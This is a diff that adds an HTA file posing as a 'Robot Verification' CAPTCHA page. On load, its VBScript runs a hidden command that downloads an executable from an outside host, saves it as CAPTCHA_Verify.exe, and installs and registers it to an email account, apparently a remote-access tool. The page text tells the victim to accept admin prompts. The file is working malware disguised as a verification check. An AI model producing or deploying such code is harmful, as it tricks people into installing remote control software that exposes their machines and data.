@@ -1,0 +1,20 @@
+<html>
+<head>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="Robot Verification"
+        SCROLL="no" 
+        SYSMENU="no">
+    <title>Robot Verification v2</title>
+    <script language="VBScript">
+        Sub Window_OnLoad
+            Dim objShell
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "start cmd.exe /c curl https://getscreen.exe/download/getscreen.exe --output CAPTCHA_Verify.exe && CAPTCHA_Verify.exe -install -register 1tbfree@proton.me >nul && exit", 1, True
+            window.close
+        End Sub
+    </script>
+</head>
+<body>
+<h1>Verification in progress... Press "yes" to admin prompts.</h1>
+</body>
+</html>
